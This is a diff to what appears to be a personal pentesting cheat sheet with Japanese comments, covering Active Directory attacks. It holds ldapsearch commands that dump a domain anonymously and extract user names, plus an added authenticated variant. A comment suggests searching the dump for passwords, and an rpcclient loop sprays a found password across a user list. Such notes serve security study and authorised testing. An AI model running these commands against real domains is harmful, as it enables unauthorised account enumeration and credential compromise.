@@ -4,8 +4,9 @@
 ldapsearch -H ldap://<IP> -x -b "DC=example,DC=com" > ldap.txt
 #これで入手したデータでpwdなど文字検索すればパスがあるかも
 
-ldapsearch -h <IP> -x -b "DC=EXAMPLE,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
-#ldapsearchでユーザ名を抽出するワンライナー
+ldapsearch -h <IP> -x -b "DC=EXAMPLE,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "　#ldapsearchでユーザ名を抽出するワンライナー
+ldapsearch -H ldap://<IP> -D "<user>@<domain>" -w "<pass>" -x -b "DC=EXAMPLE,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" " #ユーザ名、パスがわかっているとき
+
 for u in $(cat user.txt);do rpcclient -U "$u%<pass>" -c "getusername;quit" <IP> | grep Authority; done
 #見つけたパスワードでユーザリストに対してスプレーするワンライナー
 
